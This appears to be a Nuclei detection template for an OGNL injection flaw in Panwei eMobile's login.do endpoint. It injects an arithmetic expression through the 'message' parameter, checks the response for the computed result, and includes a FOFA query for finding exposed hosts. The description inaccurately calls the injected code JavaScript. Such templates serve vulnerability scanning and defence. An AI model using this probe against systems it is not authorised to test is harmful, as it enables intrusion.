id: CNVD-2017-03561
info:
  name: Panwei eMobile - OGNL Injection
  author: ritikchaddha
  severity: high
  description: Panwei eMobile is vulnerable to OGNL injection, allowing attackers
    to inject arbitrary JavaScript and potentially obtain sensitive information, modify
    data, and execute unauthorized administrative operations.
  reference:
  - https://gitee.com/cute-guy/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md
  - https://reconshell.com/vulnerability-research-list/
  metadata:
    verified: true
    fofa-query: "app=\"\u6CDB\u5FAE-eMobile\""
    impact: The vulnerability in Panwei eMobile could potentially result in unauthorized
      access and control of sensitive information by an attacker through injection
      of arbitrary JavaScript.
    recommendation: It is recommended to patch or update Panwei eMobile to prevent
      the OGNL Injection vulnerability which could allow for unauthorized access and
      modification of sensitive data.
  tags: cnvd,cnvd2017,emobile,ognl,panwei
variables:
  num1: '9999'
  num2: '5555'
requests:
- method: GET
  path:
  - '{{BaseURL}}/login.do?message={{num1}}*{{num2}}'
  - '{{BaseURL}}/login/login.do?message={{num1}}*{{num2}}'
  stop-at-first-match: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '55544445'
  - type: status
    status:
    - 200
